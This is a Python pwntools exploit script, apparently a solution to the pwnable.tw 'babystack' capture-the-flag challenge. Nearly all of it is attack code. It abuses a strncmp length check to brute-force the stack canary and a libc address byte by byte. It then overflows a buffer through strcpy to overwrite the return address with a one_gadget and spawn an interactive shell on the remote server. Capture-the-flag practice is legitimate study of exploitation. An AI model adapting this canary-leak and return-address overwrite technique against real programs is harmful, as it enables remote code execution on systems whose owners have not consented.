from pwn import *

#r = process("./babystack", env={"LD_PRELOAD" : "./libc_64.so.6"})
r = remote('chall.pwnable.tw',10205)
####  vuln 1 : check password using strncmp with input length, so if input length == 0, it will be bypassed.
####  we can also use this vuln to leak canary and libc at stack. 
####  we can check if password is correct or not to leak value by control our input and input length

#### vuln 2: magic(opt3) and check_passwd(opt1) function has same stack
#### so we can input passwd(0x7f) and call strcpy to get buffer overflow to return addr 
canary = b''

## leak canary using bruteforce
for x in range(0x10) :
    print(x)
    for i in range (0x1,0x101):
        guess = int.to_bytes(i,1,'little')
        r.sendafter(b'>> ',b'1')
        r.sendafter(b'Your passowrd :',canary + guess + b'\x00')
        text = r.recvline()
        if b'Success' in  text :
            canary += guess
            break
    r.sendafter(b'>> ',b'1')   ## logout 

success(f'canary leak SUCCESS!!!!')


#### copy libc_addr from top of stack to main stack to leak
r.sendafter(b'>> ',b'1')
r.sendafter(b'Your passowrd :',b'\x00' + b'a'*0x47)
r.sendafter(b'>> ',b'3')
r.sendafter(b'Copy :', b'a') 
r.sendafter(b'>> ',b'1')  ### logout



libc_base = b''
for x in range(0x6) :
    print(x)
    for i in range (0x1,0x101):
        guess = int.to_bytes(i,1,'little')
        r.sendafter(b'>> ',b'1')
        r.sendafter(b'Your passowrd :',b'a'*0x8 + libc_base + guess + b'\x00')
        text = r.recvline()
        if b'Success' in  text :
            libc_base += guess
            break
    r.sendafter(b'>> ',b'1')   ## logout 

libc_base = u64(libc_base+b'\x00\x00') - 0x78439
success(f'libc : {hex(libc_base)}')

one_gadget = libc_base + 0x45216

r.sendafter(b'>> ',b'1')
r.sendafter(b'Your passowrd :',b'\x00' + b'a'*0x3f + canary + b'a'*0x18 + p64(one_gadget))
r.sendafter(b'>> ',b'3')
r.sendafter(b'Copy :', b'a')   ### logout
r.sendafter(b'>> ',b'2')

r.interactive()